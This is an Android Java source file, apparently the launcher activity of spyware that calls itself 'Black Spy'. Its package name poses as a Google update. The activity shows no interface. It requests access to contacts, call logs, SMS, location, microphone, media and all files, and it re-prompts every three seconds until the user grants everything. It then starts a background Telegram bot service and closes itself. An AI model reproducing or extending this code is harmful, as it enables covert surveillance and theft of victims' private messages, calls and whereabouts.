package com.google.update;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.Settings;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int STORAGE_PERMISSION_CODE = 101;
    private boolean permissionsGranted = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // لا نستخدم layout، نطلب الأذونات مباشرة
        requestAllPermissions();
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (permissionsGranted) {
            startBotService();
            finish(); // إنهاء النشاط فوراً بعد بدء الخدمة
        }
    }

    private void requestAllPermissions() {
        List<String> neededPermissions = new ArrayList<>();

        // أذونات أساسية
        neededPermissions.add(Manifest.permission.INTERNET);
        neededPermissions.add(Manifest.permission.READ_CONTACTS);
        neededPermissions.add(Manifest.permission.READ_CALL_LOG);
        neededPermissions.add(Manifest.permission.READ_SMS);
        neededPermissions.add(Manifest.permission.RECEIVE_SMS);
        neededPermissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        neededPermissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        neededPermissions.add(Manifest.permission.RECORD_AUDIO);
        neededPermissions.add(Manifest.permission.VIBRATE);
        neededPermissions.add(Manifest.permission.WAKE_LOCK);
        neededPermissions.add(Manifest.permission.FOREGROUND_SERVICE);
        neededPermissions.add(Manifest.permission.RECEIVE_BOOT_COMPLETED);

        // أذونات التخزين حسب إصدار أندرويد
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            // Android 13+
            neededPermissions.add(Manifest.permission.READ_MEDIA_IMAGES);
            neededPermissions.add(Manifest.permission.READ_MEDIA_VIDEO);
            neededPermissions.add(Manifest.permission.READ_MEDIA_AUDIO);
            neededPermissions.add(Manifest.permission.POST_NOTIFICATIONS);
        } else {
            // Android 12 والإصدارات الأقدم
            neededPermissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            neededPermissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }

        // تصفية الأذونات التي لم تُمنح بعد
        List<String> permissionsToRequest = new ArrayList<>();
        for (String perm : neededPermissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(perm);
            }
        }

        if (!permissionsToRequest.isEmpty()) {
            // طلب الأذونات
            ActivityCompat.requestPermissions(this, 
                permissionsToRequest.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
        } else {
            permissionsGranted = true;
            startBotService();
            finish();
        }

        // طلب إذن الوصول لجميع الملفات (Android 11+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, STORAGE_PERMISSION_CODE);
                } catch (Exception e) {
                    // بعض الأجهزة لا تدعم هذا الإعداد
                }
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                permissionsGranted = true;
                Toast.makeText(this, "✅ جميع الأذونات مُنحت", Toast.LENGTH_SHORT).show();
                startBotService();
                finish();
            } else {
                // بعض الأذونات لم تُمنح، نطلبها مرة أخرى بعد 3 ثوانٍ
                Toast.makeText(this, "⚠️ الرجاء منح جميع الأذونات", Toast.LENGTH_LONG).show();
                new Handler().postDelayed(this::requestAllPermissions, 3000);
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == STORAGE_PERMISSION_CODE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && Environment.isExternalStorageManager()) {
                Toast.makeText(this, "✅ إذن الوصول لجميع الملفات مُنح", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "⚠️ الرجاء منح إذن الوصول لجميع الملفات", Toast.LENGTH_LONG).show();
            }
            // نعود لطلب أي أذونات متبقية
            requestAllPermissions();
        }
    }

    private void startBotService() {
        Intent intent = new Intent(this, TelegramBotService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
        Toast.makeText(this, "🔘 Black Spy يعمل في الخلفية", Toast.LENGTH_SHORT).show();
    }
}
